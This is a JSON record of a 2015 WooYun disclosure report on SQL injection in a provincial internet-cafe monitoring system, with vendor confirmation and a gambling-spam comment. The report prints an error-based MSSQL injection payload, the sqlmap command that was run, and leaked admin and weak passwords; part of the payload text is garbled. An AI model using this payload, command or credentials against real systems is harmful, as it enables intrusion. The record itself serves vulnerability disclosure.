{"id": 76482, "wybug_id": "wooyun-2015-0164837", "wybug_title": "某省级网吧监控系统通用SQL注入导致该省各地网吧可被控制(殃及全省网吧系统+发送网吧滚动字幕/DBA权限）", "wybug_corp": "某省级网吧监控系统", "wybug_author": "0x 80", "wybug_date": "2015-12-26 19:38", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(公安部一所)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 某省级网吧监控系统通用SQL注入导致该省各地网吧可被控制(殃及全省网吧系统+发送网吧滚动字幕/DBA权限） PS:滚动字幕，HELLO？ 详细说明：  长沙市：**.**.**.**/web;株洲市：**.**.**.**/web;湘潭市：**.**.**.**/web 衡阳市：**.**.**.**/web 邵阳市：**.**.**.**/web 岳阳市：**.**.**.**/web常德市：**.**.**.**/web张家界市：**.**.**.**/web 益阳市：**.**.**.**/web郴州市：**.**.**.**/web 永州市：**.**.**.**/web怀化市：**.**.**.**/web娄底市：**.**.**.**/web湘西自治州：**.**.**.**/web 都有WEB这个目录，同一系统均存在注入所有站都存在FCK编辑器省级管理员帐号泄漏：zxb zxb\n\n不过应该是网站设置了权限，不允许重定向随便拿1个例子来测，直接POST注入获得数据库**.**.**.** \nPlace: POSTParameter: txtName1    Type: error-based    Title: Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwULLTEwNjM2Mzg3OTJkGAEFHl9fQ29udHJvbHNSZXF1aXJlUzdEJhY2tLZXlfXxYBBQxTdWJtaXRfQ2xpY2tcr8 GHvWZF6a1Xisnn9od52q29w==&__VIEWSTATEGERATOR=DB1B4C9A&__EVENTVALIDATION=/wEWBAKEtafhCwLEhNitCALW44bXBAKXv6fMDAo5kJE2Vx2kLabdxBKGOhw2t3&txtName1=-4595') OR 5009=CONVERT(INT,(CHAR(58) CHAR(113) CH(118) CHAR(102) CHAR(58) (SELECT (CASE WHEN (5009=5009) THEN CHAR(49) ELSE CHA48) END)) CHAR(58) CHAR(111) CHAR(97) CHAR(113) CHAR(58))) AND ('EGYn'='EGYn&tPwd1=&Submit_Click.x=1&Submit_Click.y=1---do you want to exploit this SQL injection? [Y/n] y[22:12:33] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000\n\n\npython sqlmap/sqlmap.py -u http://**.**.**.**/web/ --forms --current-db --threads 10 --level 5\n\nhttp://**.**.**.**/web/  还存在弱口令123 123\n\n什么都有了**.**.**.**/web\n\n\n\n\n\n**.**.**.**/WEB/\n\n   漏洞证明：  长沙市：**.**.**.**/web;株洲市：**.**.**.**/web;湘潭市：**.**.**.**/web 衡阳市：**.**.**.**/web 邵阳市：**.**.**.**/web 岳阳市：**.**.**.**/web常德市：**.**.**.**/web张家界市：**.**.**.**/web 益阳市：**.**.**.**/web郴州市：**.**.**.**/web 永州市：**.**.**.**/web怀化市：**.**.**.**/web娄底市：**.**.**.**/web湘西自治州：**.**.**.**/web    修复方案：     版权声明：转载请注明来源 0x 80@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-12-29 15:48 厂商回复： 感谢提交！！验证确认所描述的问题，已通知其修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-07 11:41 |    \t\t百家乐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 时时彩-百家乐-澳门XXXXXXX)\t\t \n  make    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}